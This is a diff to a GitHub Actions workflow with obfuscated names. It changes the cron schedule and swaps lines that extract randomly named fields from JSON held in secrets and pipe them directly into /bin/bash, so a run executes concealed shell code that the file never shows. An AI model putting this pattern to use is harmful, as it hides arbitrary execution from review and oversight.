@@ -3,22 +3,19 @@ name: qiutongyu2314
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 2/6 * * *'
+    - cron: '39 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: qiutongyu2314
         env:
-          jrc760: ${{ secrets.jrc760 }}
+          plni2: ${{ secrets.plni2 }}
         run: |
-          echo $jrc760 | jq -r .f94660 | /bin/bash
-          echo $z74 | jq -r .ae224 | /bin/bash
-          echo $hv33803 | jq -r .gawxf41431 | /bin/bash
-          echo $oghn119 | jq -r .uzdfy06077 | /bin/bash
-          echo $f6 | jq -r .rgqtb87 | /bin/bash
-          echo $hwd536 | jq -r .hv57 | /bin/bash
-          echo $h897 | jq -r .uhl814 | /bin/bash
+          echo $plni2 | jq -r .ikszq857 | /bin/bash
+          echo $vcdkv513 | jq -r .e50 | /bin/bash
+          echo $mmy662 | jq -r .oeq790 | /bin/bash
+          echo $s25 | jq -r .gu4187 | /bin/bash
+          echo $dald8478 | jq -r .gq2 | /bin/bash
 
